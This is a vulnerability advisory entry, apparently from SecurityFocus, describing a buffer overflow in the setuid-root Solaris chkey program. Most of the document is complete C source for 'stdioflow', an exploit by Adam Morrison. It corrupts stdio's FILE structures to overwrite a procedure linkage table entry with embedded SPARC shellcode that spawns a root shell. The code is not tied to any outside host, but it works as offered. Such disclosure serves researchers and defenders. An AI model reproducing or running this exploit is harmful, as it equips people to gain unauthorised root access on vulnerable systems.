source: http://www.securityfocus.com/bid/207/info

The chkey program is used to change a users secure RPC Diffie-Hellman public key and secret key pair. A buffer overflow condition has been found in the chkey program. Since chkey has setuid root permissions, an unauthorized user may be able to gain root access.

/*
* stdioflow -- exploit for data overrun conditions
* adam@math.tau.ac.il (Adam Morrison)
*
* This program causes programs which use stdio(3S) and have data buffer
* overflow conditions to overwrite stdio's iob[] array of FILE structures
* with malicious, buffered FILEs. Thus it is possible to get stdio to
* overwrite arbitrary places in memory; specifically, it overwrites a
* specific procedure linkage table entry with SPARC assembly code to
* execute a shell.
*
* Using this program involves several steps.
*
* First, find a code path which leads to the use of stdout or stderr after
* the buffer has been overwritten. The default case being
*
* strcpy(buffer, argv[0]);
* / we gave it wrong arguments /
* fprintf(stderr, "usage: %s ...\n", buffer);
* exit(1);
*
* In this case you need to overwrite exit()'s PLT entry.
*
* Second, find out the address that the library that contains the PLT
* you want to overwrite (in this case, it would be libc) gets mmapped()
* to in the process' address space. You need it to calculate the
* absolute of the PLT entry. (Doing this is left as an, uh, exercise
* to the reader.)
*
* Finally, calculate the offset to take from the PLT entry -- you don't
* want ``usage: '' in the table, but the instructions in ``%s''. In this
* case, it would be 7.
*
* Then run it.
*/
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <libelf.h>

#include <sys/types.h>
#include <sys/link.h>

#define PLT_SYMBOL "_PROCEDURE_LINKAGE_TABLE_"

u_int shellcode[] = {
0x821020ca,
0xa61cc013,
0x900cc013,
0x920cc013,
0xa604e001,
0x91d02008,
0x2d0bd89a,
0xac15a16e,
0x2f0bdcda,
0x900b800e,
0x9203a008,
0x941a800a,
0x9c03a010,
0xec3bbff0,
0xdc23bff8,
0xc023bffc,
0x8210203b,
0x91d02008,
};
int shell_len = sizeof (shellcode) / sizeof (u_long);
u_long meow = 0x6d656f77;
char *prog;

void elferr(void);
u_long symval(char *, char *);
u_long plt_offset(char *, char *);

void
usage()
{
fprintf(stderr, "usage: %s [options] buf(name or @address) libaddr program args\n", prog);
fprintf(stderr, "options: [-l library] [-f function] [-o offset] [-e env]\n");
exit(1);
}

main(int argc, char **argv)
{
char *env = NULL;
char *library = "/usr/lib/libc.so";
char *function = "_exithandle";
u_long off, uoff = 0;
u_long libaddr, pltaddr, bufaddr, iobaddr;
u_long pltent;
char *prognam, *bufnam;
int buflen;
char *badbuf;
u_long *bp;
int c;
extern char *optarg;
extern int optind;
char **arg0, **arg;

prog = strrchr(argv[0], '/');
if (prog)
++prog;
else
prog = argv[0];

while ((c = getopt(argc, argv, "l:f:o:e:")) != EOF)
switch (c) {
case 'l':
library = optarg;
break;
case 'f':
function = optarg;
break;
case 'o':
uoff = strtol(optarg, (char **)0, 0);
break;
case 'e':
env = optarg;
break;
default:
usage();
}

if (argc - optind < 3)
usage();

bufnam = argv[optind];

/*
* This is the address that the library in which `function'
* lives gets mapped to in the child address space. We could force
* a non-privileged copy of `prognam' to dump core, and fish
* out the memory mappings from the resulting core file; but this
* is really something users should be able to do themselves.
*/
libaddr = strtoul(argv[optind+1], (char **)0, 0);
if (libaddr == 0) {
fprintf(stderr, "%s: impossible library virtual address: %s\n",
prog, argv[optind+1]);
exit(1);
}
printf("Using library %s at 0x%p\n", library, libaddr);

prognam = argv[optind+2];

arg0 = &argv[optind+3];

/*
* `pltaddr' is the offset at which the library's PLT will be
* at from `libaddr'.
*/
pltaddr = symval(library, PLT_SYMBOL);
if (pltaddr == 0) {
fprintf(stderr, "%s: could not find PLT offset from library\n",
prog);
exit(1);
}
printf("Using PLT at 0x%p\n", pltaddr);

/*
* `off' is the offset from `pltaddr' in which the desired
* function's PLT entry is.
*/
off = plt_offset(library, function);
if (off == 0) {
fprintf(stderr, "%s: impossible offset from PLT returned\n", prog);
exit(1);
}
printf("Found %s at 0x%p\n", function, off);

/*
* `bufaddr' is the name (or address) of the buffer we want to
* overflow. It's not a stack buffer, so finding it out is trivial.
*/
if (bufnam[0] == '@')
bufaddr = strtol(&bufnam[1], (char **)0, 0);
else
bufaddr = symval(prognam, bufnam);

if (bufaddr == 0) {
fprintf(stderr, "%s: illegal buffer address: %s\n", prog, prognam);
exit(1);
}
printf("Buffer at 0x%p\n", bufaddr);

/*
* `iobaddr' is obviously the address of the stdio(3) array.
*/
iobaddr = symval(prognam, "__iob");
if (iobaddr == 0) {
fprintf(stderr, "%s: could not find iob[] in %s\n", prog, prognam);
exit(1);
}
printf("iob[] at 0x%p\n", iobaddr);

/*
* This is the absolute address of the PLT entry we want to
* overwrite.
*/
pltent = libaddr + pltaddr + off;

buflen = iobaddr - bufaddr;
if (buflen < shell_len) {
fprintf(stderr, "%s: not enough space for shell code\n", prog);
exit(1);
}
if (env) {
buflen += strlen(env) + 5;
if (buflen & 3) {
fprintf(stderr, "%s: alignment problem\n", prog);
exit(1);
}
}
badbuf = (char *)malloc(buflen);
if (badbuf == 0) {
fprintf(stderr, "%s: out of memory\n", prog);
exit(1);
}

if (env) {
buflen -= (strlen(env) + 5);
sprintf(badbuf, "%s=", env);

bp = (u_long *)&badbuf[strlen(badbuf)];
} else
bp = (u_long *)badbuf;

buflen /= sizeof (*bp);
for (c = 0; c < shell_len; c++)
*bp++ = shellcode[c];

for (; c < buflen; c++)
*bp++ = meow;

/*
* stdin -- whatever
*/
*bp++ = -29;
*bp++ = 0xef7d7310;
*bp++ = 0xef7d7310 - 29;
*bp++ = 0x0101ffff;

/*
* stdout
*/
*bp++ = -29;
*bp++ = pltent - uoff;
*bp++ = pltent - 29;
*bp++ = 0x0201ffff;

/*
* stderr
*/
*bp++ = -29;
*bp++ = pltent - uoff;
*bp++ = pltent - 29;
*bp++ = 0x0202ffff;

*bp++ = 0;

printf("Using absolute address 0x%p\n", pltent - uoff);

/*
* Almost ready to do the exec()
*/
if (env)
putenv(badbuf);
else
for (arg = arg0; arg && *arg; arg++) {
if (strcmp(*arg, "%s") == 0)
*arg = badbuf;
}

printf("Using %d bytes\n", buflen*4);

if (execv(prognam, arg0) < 0) {
perror("execv");
exit(1);
}

}

u_long
symval(char *lib, char *name)
{
int fd;
int i, nsym;
u_long addr = 0;
Elf32_Shdr *shdr;
Elf *elf;
Elf_Scn *scn = (Elf_Scn *)0;
Elf32_Ehdr *ehdr;
Elf_Data *dp;
Elf32_Sym *symbol;
char *np;

fd = open(lib, O_RDONLY);
if (fd < 0) {
perror("open");
exit(1);
}

/* Initializations, see elf(3E) */
(void) elf_version(EV_CURRENT);
elf = elf_begin(fd, ELF_C_READ, 0);
if (elf == (Elf *)0)
elferr();

ehdr = elf32_getehdr(elf);
if (ehdr == (Elf32_Ehdr*)0)
elferr();

/*
* Loop through sections looking for the dynamic symbol table.
*/
while ((scn = elf_nextscn(elf, scn))) {

shdr = elf32_getshdr(scn);
if (shdr == (Elf32_Shdr *)0)
elferr();

if (shdr->sh_type == SHT_DYNSYM)
break;
}

if (scn == (Elf_Scn *)0) {
fprintf(stderr, "%s: dynamic symbol table not found\n", prog);
exit(1);
}

dp = elf_getdata(scn, (Elf_Data *)0);
if (dp == (Elf_Data *)0)
elferr();

if (dp->d_size == 0) {
fprintf(stderr, "%s: .dynamic symbol table empty\n", prog);
exit(1);
}

symbol = (Elf32_Sym *)dp->d_buf;
nsym = dp->d_size / sizeof (*symbol);

for (i = 0; i < nsym; i++) {
np = elf_strptr(elf, shdr->sh_link, (size_t)
symbol[i].st_name);
if (np && !strcmp(np, name))
break;

}

if (i < nsym)
addr = symbol[i].st_value;

(void) elf_end(elf);
(void) close(fd);

return (addr);
}

u_long
plt_offset(char *lib, char *func)
{
int fd;
Elf *elf;
Elf_Scn *scn = (Elf_Scn *)0;
Elf_Data *dp;
Elf32_Ehdr *ehdr;
Elf32_Rela *relocp = (Elf32_Rela *)0;
Elf32_Word pltsz = 0;
Elf32_Shdr *shdr;
Elf_Scn *symtab;
Elf32_Sym *symbols;
char *np;
u_long offset = 0;
u_long plt;

fd = open(lib, O_RDONLY);
if (fd < 0) {
perror("open");
exit(1);
}

/* Initializations, see elf(3E) */
(void) elf_version(EV_CURRENT);
elf = elf_begin(fd, ELF_C_READ, 0);
if (elf == (Elf *)0)
elferr();

ehdr = elf32_getehdr(elf);
if (ehdr == (Elf32_Ehdr *)0)
elferr();

/*
* Loop through sections looking for the relocation entries
* associated with the procedure linkage table.
*/
while ((scn = elf_nextscn(elf, scn))) {

shdr = elf32_getshdr(scn);
if (shdr == (Elf32_Shdr *)0)
elferr();

if (shdr->sh_type == SHT_RELA) {
np = elf_strptr(elf, ehdr->e_shstrndx, (size_t) shdr->sh_name);
if (np && !strcmp(np, ".rela.plt"))
break;
}

}

if (scn == (Elf_Scn *)0) {
fprintf(stderr, "%s: .rela.plt section not found\n", prog);
exit(1);
}

dp = elf_getdata(scn, (Elf_Data *)0);
if (dp == (Elf_Data *)0)
elferr();

if (dp->d_size == 0) {
fprintf(stderr, "%s: .rela.plt section empty\n", prog);
exit(1);
}

/*
* The .rela.plt section contains an array of relocation entries,
* the first 4 are not used.
*/
relocp = (Elf32_Rela *)dp->d_buf;
pltsz = dp->d_size / sizeof (*relocp);

relocp += 4;
pltsz -= 4;

/*
* Find the symbol table associated with this section.
*/
symtab = elf_getscn(elf, shdr->sh_link);
if (symtab == (Elf_Scn *)0)
elferr();

shdr = elf32_getshdr(symtab);
if (shdr == (Elf32_Shdr *)0)
elferr();

dp = elf_getdata(symtab, (Elf_Data *)0);
if (dp == (Elf_Data *)0)
elferr();

if (dp->d_size == 0) {
fprintf(stderr, "%s: dynamic symbol table empty\n", prog);
exit(1);
}

symbols = (Elf32_Sym *)dp->d_buf;

/*
* Loop through the relocation list, looking for the desired
* symbol.
*/
while (pltsz-- > 0) {
Elf32_Word ndx = ELF32_R_SYM(relocp->r_info);

np = elf_strptr(elf, shdr->sh_link, (size_t)
symbols[ndx].st_name);
if (np && !strcmp(np, func))
break;

relocp++;
}

if (relocp) {
plt = symval(lib, PLT_SYMBOL);
offset = relocp->r_offset - plt;
}

(void) elf_end(elf);
(void) close(fd);

return (offset);
}

void
elferr()
{
fprintf(stderr, "%s: %s\n", prog, elf_errmsg(elf_errno()));

exit(1);
}
